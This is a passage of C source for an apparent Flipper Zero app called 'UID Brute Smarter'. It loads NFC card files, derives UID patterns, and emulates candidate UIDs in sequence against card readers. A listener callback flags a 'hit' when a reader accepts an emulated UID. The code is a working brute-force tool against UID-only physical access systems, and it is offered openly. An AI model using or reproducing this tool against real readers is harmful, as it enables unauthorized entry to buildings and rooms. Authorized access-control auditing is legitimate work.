/*
 * Copyright (c) 2024, UID Brute Smarter Contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 *    contributors may be used to endorse or promote products derived from
 *    this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/dialog_ex.h>
#include <gui/modules/popup.h>
#include <gui/modules/text_input.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/file_browser.h>
#include <storage/storage.h>
#include <dialogs/dialogs.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/nfc_poller.h>
#include <nfc/helpers/nfc_supported_cards.h>
#include <nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <nfc/nfc_listener.h>

#include "pattern_engine.h"
#include "scenes/uid_brute_smarter_scene_about.h"

#define TAG "UidBruteSmarter"

// Debug logging macros
#define DEBUG_LOG(fmt, ...) FURI_LOG_I(TAG, fmt, ##__VA_ARGS__)
#define INFO_LOG(fmt, ...) FURI_LOG_I(TAG, fmt, ##__VA_ARGS__)
#define ERROR_LOG(fmt, ...) FURI_LOG_E(TAG, fmt, ##__VA_ARGS__)
#define WARN_LOG(fmt, ...) FURI_LOG_W(TAG, fmt, ##__VA_ARGS__)

// Configuration constants
#define MAX_UIDS 5
#define DEFAULT_DELAY_MS 500
#define DEFAULT_PAUSE_EVERY 0
#define DEFAULT_PAUSE_DURATION_S 3
#define NFC_APP_FOLDER "/ext/nfc"
#define NFC_OPERATION_TIMEOUT_MS 2000
#define MAX_NFC_RETRY_ATTEMPTS 3

// UI constants
#define POPUP_TIMEOUT_MS 2000
#define BRUTE_THREAD_STACK_SIZE 8192
#define MIN_DELAY_MS 100
#define MAX_DELAY_MS 1000
#define DELAY_STEP_MS 100
#define PAUSE_STEP 10
#define MAX_PAUSE_EVERY 100
#define MAX_PAUSE_DURATION_S 10
#define KEY_DEBOUNCE_MS 300

// NFC constants
#define STANDARD_UID_LENGTH 4
#define EXTENDED_UID_LENGTH 7
#define EXTENDED_UID_PREFIX_LENGTH 3
#define MAX_UID_LENGTH 10
#define MAX_FILE_SIZE (1024 * 1024) // 1MB
#define ATQA_DEFAULT_LOW 0x00
#define ATQA_DEFAULT_HIGH 0x04
#define ATQA_DEFAULT_HIGH_UID7 0x44
#define SAK_DEFAULT 0x08

// Enhanced key storage structure
typedef struct {
    uint32_t uid;                       // full value for 4-byte UIDs, variable low 4 bytes for 7-byte UIDs
    uint8_t uid_len;                    // 4 or 7
    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH]; // first 3 bytes of a 7-byte UID (fixed manufacturer part)
    uint8_t atqa[2];
    uint8_t sak;
    char* name;
    char* file_path;
    uint32_t loaded_time;
    bool is_active;
} KeyInfo;

// Enhanced app structure with key management
typedef struct {
    uint32_t uids[MAX_UIDS];
    uint8_t uid_count;
    uint8_t uid_len;                              // 4 or 7, taken from the first loaded card
    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH]; // fixed part of a 7-byte UID
    uint8_t atqa[2];
    uint8_t sak;
    PatternType pattern;
    uint32_t start_uid;
    uint32_t end_uid;
    uint32_t step;
    uint32_t current_uid;
    uint32_t bitmask;  // For bitmask patterns
    uint32_t delay_ms;
    uint32_t pause_every;
    uint32_t pause_duration_s;
    bool stop_on_hit;  // stop the run when a reader accepts a candidate UID
    bool is_running;
    bool should_stop;
    uint32_t total_attempts;
    uint32_t pause_counter;
    uint32_t total_range_size;  // Total UIDs in the range (for progress display)
    bool timer_period_elevated;  // true while brute_timer runs at the elongated pause period
} UidBruteSmartApp;

typedef enum {
    UidBruteSmarterViewSplash,
    UidBruteSmarterViewCardLoader,
    UidBruteSmarterViewPattern,
    UidBruteSmarterViewConfig,
    UidBruteSmarterViewBrute,
    UidBruteSmarterViewMenu,
    UidBruteSmarterViewKeyList,
    UidBruteSmarterViewPopup,
    UidBruteSmarterViewAbout
} UidBruteSmarterView;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Submenu* key_list_submenu;  // Separate submenu for key list
    DialogEx* dialog_ex;
    Popup* popup;
    TextInput* text_input;
    VariableItemList* variable_item_list;
    FileBrowser* file_browser;
    Storage* storage;
    Nfc* nfc;
    NfcDevice* nfc_device;
    View* about_view;
    
    UidBruteSmartApp* app;
    KeyInfo loaded_keys[MAX_UIDS];
    uint8_t loaded_keys_count;
    char file_path[256];
    
    // Simple timer-based brute force (no threading)
    FuriTimer* brute_timer;
    uint32_t current_iteration;  // Current iteration counter (replaces current_index)
    NfcListener* listener;  // Current NFC listener
    uint32_t last_emulation_time;  // Timestamp of last emulation start
    uint8_t nfc_retry_count;  // NFC operation retry counter
    bool is_view_transitioning;  // Flag to prevent race conditions during view changes
    uint32_t last_key_event_time;  // Timestamp of last key event for debouncing
    char brute_header[32];  // Buffer for brute force header text with pattern name

    // Hit detection: written by the NFC listener callback (NFC thread),
    // read by the brute timer callback (timer thread). Plain volatiles are
    // sufficient: single producer, single-word flags only.
    volatile bool hit_detected;          // reader sent a CRC-valid command to the emulated UID
    volatile uint32_t hit_uid;           // candidate UID that was engaged
    volatile uint32_t reader_engagements; // total post-selection commands seen
    volatile uint32_t reader_halted;      // total HLTA events seen (weak signal)
} UidBruteSmarter;

// Forward declarations
static void uid_brute_smarter_setup_menu(UidBruteSmarter* instance);
static void uid_brute_smarter_setup_config(UidBruteSmarter* instance);
static void uid_brute_smarter_start_brute_force(UidBruteSmarter* instance);
static bool uid_brute_smarter_load_nfc_file(UidBruteSmarter* instance, const char* path);
static void uid_brute_smarter_show_key_list(UidBruteSmarter* instance);
static uint32_t uid_brute_smarter_key_list_back_callback(void* context);
static uint32_t uid_brute_smarter_brute_back_callback(void* context);
static void uid_brute_smarter_timer_callback(void* context);
static void uid_brute_smarter_emulate_uid(UidBruteSmarter* instance, uint32_t uid);
static void uid_brute_smarter_safe_switch_view(UidBruteSmarter* instance, UidBruteSmarterView view);

// NFC listener callback: runs in the NFC worker thread while a candidate UID
// is being emulated. A reader that selects our UID and then issues a
// CRC-valid command (e.g. an authentication attempt) is treating it as a real
// card, which is the acceptance signal for UID-only access systems. HLTA
// after selection is a weaker hint and is only counted.
static NfcCommand uid_brute_smarter_listener_callback(NfcGenericEvent event, void* context) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;

    if(event.protocol != NfcProtocolIso14443_3a || event.event_data == NULL) {
        return NfcCommandContinue;
    }

    const Iso14443_3aListenerEvent* listener_event = event.event_data;
    switch(listener_event->type) {
    case Iso14443_3aListenerEventTypeReceivedData:
    case Iso14443_3aListenerEventTypeReceivedStandardFrame:
        if(!instance->hit_detected) {
            instance->hit_detected = true;
            instance->hit_uid = instance->app->current_uid;
        }
        instance->reader_engagements++;
        break;
    case Iso14443_3aListenerEventTypeHalted:
        instance->reader_halted++;
        break;
    default:
        break;
    }

    return NfcCommandContinue;
}
static bool uid_brute_smarter_is_key_debounced(UidBruteSmarter* instance);
static uint32_t uid_brute_smarter_about_back_callback(void* context);
static uint32_t uid_brute_smarter_calculate_uid(UidBruteSmarter* instance, uint32_t iteration);
static void uid_brute_smarter_hit_popup_callback(void* context);

// Calculate UID on-the-fly based on pattern and iteration number
static uint32_t uid_brute_smarter_calculate_uid(UidBruteSmarter* instance, uint32_t iteration) {
    if(!instance || !instance->app) {
        return 0;
    }

    UidBruteSmartApp* app = instance->app;

    switch(app->pattern) {
        case PatternInc1:
        case PatternUnknown:
            // Simple linear increment by 1
            return app->start_uid + iteration;

        case PatternIncK:
        case PatternLe16:
            // Linear increment by step (K, or 0x10000 for the 16-bit counter pattern)
            return app->start_uid + (iteration * app->step);

        case PatternBitmask:
            // Bitmask pattern - iterate through bit combinations
            {
                uint32_t base = app->start_uid;
                uint32_t bitmask = app->bitmask;
                uint32_t current_uid = base;
                uint32_t temp = iteration;

                // Set bits according to iteration value
                for(uint8_t i = 0; i < 32; i++) {
                    if((bitmask >> i) & 1) {
                        if(temp & 1) {
                            current_uid |= (1 << i);
                        }
                        temp >>= 1;
                    }
                }
                return current_uid;
            }

        default:
            ERROR_LOG("[CALC_UID] Unknown pattern type: %d", app->pattern);
            return app->start_uid;
    }
}

static bool uid_brute_smarter_is_key_debounced(UidBruteSmarter* instance) {
    if(!instance) return false;
    
    uint32_t current_time = furi_get_tick();
    if(current_time - instance->last_key_event_time < KEY_DEBOUNCE_MS) {
        DEBUG_LOG("[DEBOUNCE] Key event too soon, debouncing");
        return false;
    }
    
    instance->last_key_event_time = current_time;
    return true;
}

static void uid_brute_smarter_safe_switch_view(UidBruteSmarter* instance, UidBruteSmarterView view) {
    if(!instance || !instance->view_dispatcher) {
        ERROR_LOG("[SAFE_SWITCH] Invalid instance or view_dispatcher");
        return;
    }
    
    // Check if we're already transitioning to prevent race conditions
    if(instance->is_view_transitioning) {
        DEBUG_LOG("[SAFE_SWITCH] View transition already in progress, skipping");
        return;
    }
    
    // Validate timer state before view operations
    if(instance->brute_timer && instance->app && instance->app->is_running) {
        // If switching away from brute view while timer is running, ensure proper cleanup
        if(view != UidBruteSmarterViewBrute) {
            DEBUG_LOG("[SAFE_SWITCH] Warning: Switching away from brute view while timer is active");
        }
    }
    
    // Additional safety: check if app state is consistent
    if(instance->app) {
        if(instance->app->is_running && !instance->brute_timer) {
            WARN_LOG("[SAFE_SWITCH] Inconsistent state: app running but no timer");
            instance->app->is_running = false;
        }
        if(!instance->app->is_running && instance->brute_timer) {
            WARN_LOG("[SAFE_SWITCH] Inconsistent state: timer exists but app not running");
        }
    }
    
    // Set transition flag
    instance->is_view_transitioning = true;
    
    // Perform the view switch immediately without blocking delays
    DEBUG_LOG("[SAFE_SWITCH] Switching to view: %d", view);
    view_dispatcher_switch_to_view(instance->view_dispatcher, view);
    
    // Clear transition flag immediately
    instance->is_view_transitioning = false;
    
    DEBUG_LOG("[SAFE_SWITCH] View transition complete");
}

static uint32_t uid_brute_smarter_exit_callback(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static void uid_brute_smarter_splash_callback(DialogExResult result, void* context) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    if(result == DialogExResultCenter) {
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
    }
}

static void uid_brute_smarter_brute_callback(DialogExResult result, void* context) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    if(result == DialogExResultCenter) {
        // Stop button pressed - set flag for timer to handle cleanup
        DEBUG_LOG("[BRUTE_CALLBACK] Stop button pressed");
        if(instance && instance->app) {
            instance->app->should_stop = true;
        }
    }
}

static void uid_brute_smarter_show_splash(UidBruteSmarter* instance) {
    dialog_ex_set_header(instance->dialog_ex, "UID Brute Smarter", 64, 3, AlignCenter, AlignTop);
    dialog_ex_set_text(
        instance->dialog_ex,
        "Enhanced UID brute-force tool\nwith key management",
        64,
        32,
        AlignCenter,
        AlignCenter);
    dialog_ex_set_center_button_text(instance->dialog_ex, "Continue");
    dialog_ex_set_context(instance->dialog_ex, instance);
    dialog_ex_set_result_callback(instance->dialog_ex, uid_brute_smarter_splash_callback);
    
    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewSplash);
}

static void uid_brute_smarter_free(UidBruteSmarter* instance) {
    if(!instance) {
        ERROR_LOG("[FREE] Attempted to free NULL instance");
        return;
    }
    
    DEBUG_LOG("[FREE] Starting cleanup sequence");
    
    // Stop and free timer if running
    if(instance->brute_timer) {
        DEBUG_LOG("[FREE] Stopping and freeing timer");
        furi_timer_stop(instance->brute_timer);
        furi_timer_free(instance->brute_timer);
        instance->brute_timer = NULL;
    }
    
    // Stop NFC listener if running
    if(instance->listener) {
        DEBUG_LOG("[FREE] Stopping and freeing NFC listener");
        nfc_listener_stop(instance->listener);
        nfc_listener_free(instance->listener);
        instance->listener = NULL;
    }
    
    // Free loaded key memory with validation
    DEBUG_LOG("[FREE] Freeing %d loaded keys", instance->loaded_keys_count);
    for(int i = 0; i < instance->loaded_keys_count && i < MAX_UIDS; i++) {
        if(instance->loaded_keys[i].name) {
            free(instance->loaded_keys[i].name);
            instance->loaded_keys[i].name = NULL;
        }
        if(instance->loaded_keys[i].file_path) {
            free(instance->loaded_keys[i].file_path);
            instance->loaded_keys[i].file_path = NULL;
        }
        instance->loaded_keys[i].uid = 0;
        instance->loaded_keys[i].is_active = false;
    }
    instance->loaded_keys_count = 0;
    
    // Remove views
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewSplash);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewCardLoader);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewConfig);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewBrute);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewMenu);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewKeyList);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewPopup);
    view_dispatcher_remove_view(instance->view_dispatcher, UidBruteSmarterViewAbout);

    // Free GUI components
    submenu_free(instance->submenu);
    submenu_free(instance->key_list_submenu);  // Free the key list submenu
    dialog_ex_free(instance->dialog_ex);
    popup_free(instance->popup);
    text_input_free(instance->text_input);
    variable_item_list_free(instance->variable_item_list);
    uid_brute_smarter_scene_about_free(instance->about_view);
    
    // Free NFC with validation
    if(instance->nfc_device) {
        DEBUG_LOG("[FREE] Freeing NFC device");
        nfc_device_clear(instance->nfc_device);
        nfc_device_free(instance->nfc_device);
        instance->nfc_device = NULL;
    }
    if(instance->nfc) {
        DEBUG_LOG("[FREE] Freeing NFC");
        nfc_free(instance->nfc);
        instance->nfc = NULL;
    }
    
    // Close records
    furi_record_close(RECORD_STORAGE);
    furi_record_close(RECORD_GUI);
    
    // Free app data
    if(instance->app) {
        free(instance->app);
    }
    
    // Free view dispatcher
    view_dispatcher_free(instance->view_dispatcher);
    
    // Free instance
    free(instance);
}

static UidBruteSmarter* uid_brute_smarter_alloc(void) {
    UidBruteSmarter* instance = malloc(sizeof(UidBruteSmarter));
    if(!instance) {
        ERROR_LOG("[ALLOC] Failed to allocate instance");
        return NULL;
    }
    
    // Set all pointers to NULL by default
    memset(instance, 0, sizeof(UidBruteSmarter));
    
    // Allocate app data
    instance->app = malloc(sizeof(UidBruteSmartApp));
    if(!instance->app) {
        ERROR_LOG("[ALLOC] Failed to allocate app data");
        free(instance);
        return NULL;
    }
    memset(instance->app, 0, sizeof(UidBruteSmartApp));
    instance->app->delay_ms = DEFAULT_DELAY_MS;
    instance->app->pause_every = DEFAULT_PAUSE_EVERY;
    instance->app->pause_duration_s = DEFAULT_PAUSE_DURATION_S;
    instance->app->stop_on_hit = true;
    instance->app->uid_len = STANDARD_UID_LENGTH;
    instance->app->atqa[0] = ATQA_DEFAULT_LOW;
    instance->app->atqa[1] = ATQA_DEFAULT_HIGH;
    instance->app->sak = SAK_DEFAULT;
    
    // Open GUI record
    instance->gui = furi_record_open(RECORD_GUI);
    
    // Open Storage record
    instance->storage = furi_record_open(RECORD_STORAGE);
    
    // Initialize NFC
    instance->nfc = nfc_alloc();
    instance->nfc_device = nfc_device_alloc();
    
    // Initialize view dispatcher
    instance->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(
        instance->view_dispatcher, instance->gui, ViewDispatcherTypeFullscreen);
    
    // Initialize views
    instance->submenu = submenu_alloc();
    instance->key_list_submenu = submenu_alloc();
    instance->dialog_ex = dialog_ex_alloc();
    instance->popup = popup_alloc();
    instance->text_input = text_input_alloc();
    instance->variable_item_list = variable_item_list_alloc();
    instance->about_view = uid_brute_smarter_scene_about_alloc();

    // Add views to dispatcher
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewSplash, dialog_ex_get_view(instance->dialog_ex));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewMenu, submenu_get_view(instance->submenu));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewConfig, variable_item_list_get_view(instance->variable_item_list));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewBrute, dialog_ex_get_view(instance->dialog_ex));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewCardLoader, text_input_get_view(instance->text_input));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewKeyList, submenu_get_view(instance->key_list_submenu));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewPopup, popup_get_view(instance->popup));
    view_dispatcher_add_view(
        instance->view_dispatcher, UidBruteSmarterViewAbout, instance->about_view);
    
    return instance;
}

static void uid_brute_smarter_add_key(
    UidBruteSmarter* instance,
    const char* filename,
    uint32_t uid,
    uint8_t uid_len,
    const uint8_t* uid_prefix,
    const uint8_t atqa[2],
    uint8_t sak) {
    DEBUG_LOG("[ADD_KEY] Starting add_key with count: %d, uid: %08lX", instance->loaded_keys_count, uid);

    if(!instance || !filename) {
        ERROR_LOG("[ADD_KEY] NULL instance or filename");
        return;
    }

    if(instance->loaded_keys_count >= MAX_UIDS) {
        ERROR_LOG("[ADD_KEY] Max keys reached (%d)", MAX_UIDS);
        return;
    }

    int index = instance->loaded_keys_count;

    instance->loaded_keys[index].uid = uid;
    instance->loaded_keys[index].uid_len = uid_len;
    if(uid_len == EXTENDED_UID_LENGTH && uid_prefix != NULL) {
        memcpy(instance->loaded_keys[index].uid_prefix, uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
    } else {
        memset(instance->loaded_keys[index].uid_prefix, 0, EXTENDED_UID_PREFIX_LENGTH);
    }
    instance->loaded_keys[index].atqa[0] = atqa ? atqa[0] : ATQA_DEFAULT_LOW;
    instance->loaded_keys[index].atqa[1] =
        atqa ? atqa[1] :
               (uid_len == EXTENDED_UID_LENGTH ? ATQA_DEFAULT_HIGH_UID7 : ATQA_DEFAULT_HIGH);
    instance->loaded_keys[index].sak = sak ? sak : SAK_DEFAULT;
    instance->loaded_keys[index].loaded_time = furi_get_tick();
    instance->loaded_keys[index].is_active = true;
    
    // Use strdup for safer string duplication
    instance->loaded_keys[index].file_path = strdup(filename);
    if(!instance->loaded_keys[index].file_path) {
        ERROR_LOG("[ADD_KEY] strdup failed for filename");
        return;
    }
    
    // Generate key name
    char key_name[32];
    snprintf(key_name, sizeof(key_name), "Key %d", index + 1);
    instance->loaded_keys[index].name = strdup(key_name);
    if(!instance->loaded_keys[index].name) {
        ERROR_LOG("[ADD_KEY] strdup failed for key_name");
        free(instance->loaded_keys[index].file_path);
        instance->loaded_keys[index].file_path = NULL;
        return;
    }
    
    // Add to app uids
    if(instance->app->uid_count < MAX_UIDS) {
        if(instance->app->uid_count == 0) {
            // First card defines the tag characteristics for the whole run
            instance->app->uid_len = uid_len;
            memcpy(instance->app->uid_prefix, instance->loaded_keys[index].uid_prefix, EXTENDED_UID_PREFIX_LENGTH);
            instance->app->atqa[0] = instance->loaded_keys[index].atqa[0];
            instance->app->atqa[1] = instance->loaded_keys[index].atqa[1];
            instance->app->sak = instance->loaded_keys[index].sak;
        }
        instance->app->uids[instance->app->uid_count] = uid;
        instance->app->uid_count++;
    }
    
    instance->loaded_keys_count++;
    DEBUG_LOG("[ADD_KEY] Successfully added key %d, total: %d", index, instance->loaded_keys_count);
}

static void uid_brute_smarter_remove_key(UidBruteSmarter* instance, uint8_t index) {
    if(index >= instance->loaded_keys_count) return;
    
    uint32_t removed_uid = instance->loaded_keys[index].uid;
    
    // Free memory
    free(instance->loaded_keys[index].name);
    free(instance->loaded_keys[index].file_path);
    
    // Shift remaining keys
    for(int i = index; i < instance->loaded_keys_count - 1; i++) {
        instance->loaded_keys[i] = instance->loaded_keys[i + 1];
    }
    
    // Update app uids
    for(int i = 0; i < instance->app->uid_count; i++) {
        if(instance->app->uids[i] == removed_uid) {
            for(int j = i; j < instance->app->uid_count - 1; j++) {
                instance->app->uids[j] = instance->app->uids[j + 1];
            }
            instance->app->uid_count--;
            break;
        }
    }
    
    instance->loaded_keys_count--;

    // When the last key goes away the tag characteristics must not survive
    if(instance->app->uid_count == 0) {
        instance->app->uid_len = STANDARD_UID_LENGTH;
        memset(instance->app->uid_prefix, 0, EXTENDED_UID_PREFIX_LENGTH);
        instance->app->atqa[0] = ATQA_DEFAULT_LOW;
        instance->app->atqa[1] = ATQA_DEFAULT_HIGH;
        instance->app->sak = SAK_DEFAULT;
    }
}

static void uid_brute_smarter_key_list_callback(void* context, uint32_t index) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    
    if(!uid_brute_smarter_is_key_debounced(instance)) {
        return;
    }
    
    DEBUG_LOG("[KEY_LIST] Callback triggered with index: %lu", index);
    
    if(index == 255) {
        // Unload All
        DEBUG_LOG("[KEY_LIST] Unload All selected");
        for(int i = instance->loaded_keys_count - 1; i >= 0; i--) {
            uid_brute_smarter_remove_key(instance, i);
        }
        // Return to main menu after unloading all
        uid_brute_smarter_setup_menu(instance);
        uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewMenu);
    } else if(index < instance->loaded_keys_count) {
        // Remove specific key
        DEBUG_LOG("[KEY_LIST] Removing key at index: %lu", index);
        uid_brute_smarter_remove_key(instance, index);
        uid_brute_smarter_show_key_list(instance);
    }
}

static void uid_brute_smarter_show_key_list(UidBruteSmarter* instance) {
    DEBUG_LOG("[KEY_LIST] Showing key list with %d keys", instance->loaded_keys_count);
    
    // Use the dedicated key_list_submenu
    submenu_reset(instance->key_list_submenu);
    char header_text[32];
    snprintf(header_text, sizeof(header_text), "Loaded Keys (%d)", instance->loaded_keys_count);
    submenu_set_header(instance->key_list_submenu, header_text);
    
    for(int i = 0; i < instance->loaded_keys_count; i++) {
        char item_text[64];
        if(instance->loaded_keys[i].uid_len == EXTENDED_UID_LENGTH) {
            snprintf(item_text, sizeof(item_text), "%s (%02X%02X%02X%08lX)",
                     instance->loaded_keys[i].name,
                     instance->loaded_keys[i].uid_prefix[0],
                     instance->loaded_keys[i].uid_prefix[1],
                     instance->loaded_keys[i].uid_prefix[2],
                     instance->loaded_keys[i].uid);
        } else {
            snprintf(item_text, sizeof(item_text), "%s (%08lX)",
                     instance->loaded_keys[i].name,
                     instance->loaded_keys[i].uid);
        }
        submenu_add_item(instance->key_list_submenu, item_text, i, uid_brute_smarter_key_list_callback, instance);
        DEBUG_LOG("[KEY_LIST] Added key item: %s", item_text);
    }
    
    // Add action buttons
    if(instance->loaded_keys_count > 0) {
        submenu_add_item(instance->key_list_submenu, "Unload All", 255, uid_brute_smarter_key_list_callback, instance);
        DEBUG_LOG("[KEY_LIST] Added 'Unload All' button");
    }
    
    // Set proper back navigation to return to main menu
    view_set_previous_callback(submenu_get_view(instance->key_list_submenu), uid_brute_smarter_key_list_back_callback);
    
    uid_brute_smarter_safe_switch_view(instance, UidBruteSmarterViewKeyList);
    DEBUG_LOG("[KEY_LIST] Switched to key list view");
}

static bool uid_brute_smarter_load_nfc_file(UidBruteSmarter* instance, const char* path) {
    DEBUG_LOG("Loading NFC file: %s", path);
    
    // Enhanced input validation
    if(!instance || !path) {
        ERROR_LOG("NULL instance or path provided");
        return false;
    }
    
    size_t path_len = strlen(path);
    if(path_len == 0 || path_len > 255) {
        ERROR_LOG("Invalid file path length: %zu", path_len);
        return false;
    }
    
    if(!furi_string_end_with_str(furi_string_alloc_set(path), ".nfc")) {
        WARN_LOG("File does not have .nfc extension: %s", path);
        return false;
    }
    
    // Check if file exists and is accessible
    Storage* storage = furi_record_open(RECORD_STORAGE);
    if(!storage) {
        ERROR_LOG("Failed to open storage record");
        return false;
    }
    
    FileInfo file_info;
    FS_Error stat_result = storage_common_stat(storage, path, &file_info);
    bool file_exists = (stat_result == FSE_OK);
    furi_record_close(RECORD_STORAGE);
    
    if(!file_exists) {
        ERROR_LOG("File does not exist or is not accessible: %s", path);
        return false;
    }
    
    if(file_info.size == 0) {
        ERROR_LOG("Empty file: %s", path);
        return false;
    }
    
    if(file_info.size > MAX_FILE_SIZE) {
        ERROR_LOG("File too large: %s (%llu bytes)", path, (unsigned long long)file_info.size);
        return false;
    }
    
    // Create a temporary NFC device to avoid corrupting the main one
    NfcDevice* temp_device = nfc_device_alloc();
    if(!temp_device) {
        ERROR_LOG("Failed to allocate temporary NFC device");
        return false;
    }
    
    bool success = false;
    
    // Try to load with error handling
    FURI_LOG_D(TAG, "Attempting nfc_device_load...");
    if(!nfc_device_load(temp_device, path)) {
        ERROR_LOG("nfc_device_load failed for: %s", path);
        goto cleanup;
    }
    
    FURI_LOG_D(TAG, "Checking protocol data...");
    
    const Iso14443_3aData* iso_data = nfc_device_get_data(temp_device, NfcProtocolIso14443_3a);
    if(!iso_data) {
        ERROR_LOG("No ISO14443-3a data found in file: %s", path);
        goto cleanup;
    }
    
    // Validate the data structure
    if(iso_data->uid_len != STANDARD_UID_LENGTH &&
       iso_data->uid_len != EXTENDED_UID_LENGTH) {
        ERROR_LOG("Unsupported UID length: %d (expected 4 or 7 bytes)", iso_data->uid_len);
        goto cleanup;
    }

    if(instance->app->uid_count >= MAX_UIDS) {
        ERROR_LOG("Maximum UIDs reached (%d)", MAX_UIDS);
        goto cleanup;
    }

    // All cards in one audit must share the UID size, otherwise pattern
    // detection would compare unrelated value spaces.
    if(instance->app->uid_count > 0 && instance->app->uid_len != iso_data->uid_len) {
        ERROR_LOG(
            "Mixed UID lengths: loaded cards use %u bytes, file uses %u",
            instance->app->uid_len,
            iso_data->uid_len);
        goto cleanup;
    }

    DEBUG_LOG("ISO14443-3a data found, UID length: %d, ATQA: 0x%04X, SAK: 0x%02X",
              iso_data->uid_len, iso_data->atqa[0] | (iso_data->atqa[1] << 8), iso_data->sak);

    uint8_t uid_len = iso_data->uid_len;
    uint8_t uid_prefix[EXTENDED_UID_PREFIX_LENGTH] = {0};
    if(uid_len == EXTENDED_UID_LENGTH) {
        // Keep the manufacturer prefix fixed; only the low 4 bytes vary.
        memcpy(uid_prefix, iso_data->uid, EXTENDED_UID_PREFIX_LENGTH);
    }

    // Validate UID bytes with enhanced bounds checking
    uint32_t uid = 0;

    DEBUG_LOG("UID bytes:");
    for(uint8_t i = 0; i < uid_len; i++) {
        DEBUG_LOG("  UID[%d] = 0x%02X", i, iso_data->uid[i]);
    }
    for(uint8_t i = EXTENDED_UID_PREFIX_LENGTH; i < uid_len; i++) {
        uid |= ((uint32_t)iso_data->uid[i]) << (8 * (uid_len - 1 - i));
    }

    // Basic UID validation (variable part not all zeros or all 0xFF)
    uint32_t all_zeros = 0x00000000;
    uint32_t all_ones = 0xFFFFFFFF;

    if(uid == all_zeros || uid == all_ones) {
        ERROR_LOG("Invalid UID value: 0x%08lX", uid);
        goto cleanup;
    }

    DEBUG_LOG("Extracted valid UID: 0x%08lX", uid);

    // Store the key with enhanced info
    uid_brute_smarter_add_key(
        instance, path, uid, uid_len, uid_prefix, iso_data->atqa, iso_data->sak);
    success = true;

cleanup:
    nfc_device_free(temp_device);
    return success;
}

static void uid_brute_smarter_menu_callback(void* context, uint32_t index) {
    UidBruteSmarter* instance = (UidBruteSmarter*)context;
    
    if(!uid_brute_smarter_is_key_debounced(instance)) {
        return;
    }
    
    DEBUG_LOG("Menu callback triggered with index: %lu", index);
    
    switch(index) {
        case 0: // Load Cards
            {
                DialogsApp* dialogs = furi_record_open(RECORD_DIALOGS);
                FuriString* file_path = furi_string_alloc();
                FuriString* nfc_folder = furi_string_alloc_set(NFC_APP_FOLDER);
                
                DialogsFileBrowserOptions options;
                dialog_file_browser_set_basic_options(&options, ".nfc", NULL);
                options.base_path = NFC_APP_FOLDER;
                
                bool success = dialog_file_browser_show(
                    dialogs, 
                    file_path, 
                    nfc_folder,
                    &options);
                
                if(success) {
                    const char* path = furi_string_get_cstr(file_path);
                    DEBUG_LOG("User selected NFC file: %s", path);
                    
                    if(uid_brute_smarter_load_nfc_file(instance, path)) {
                        popup_set_header(instance->popup, "Card Loaded", 64, 20, AlignCenter, AlignTop);
                        char progress_text[32];
                        snprintf(progress_text, sizeof(progress_text), "%d UIDs loaded",
                                 instance->loaded_keys_count);
                        popup_set_text(instance->popup, progress_text, 64, 40, AlignCenter, AlignTop);
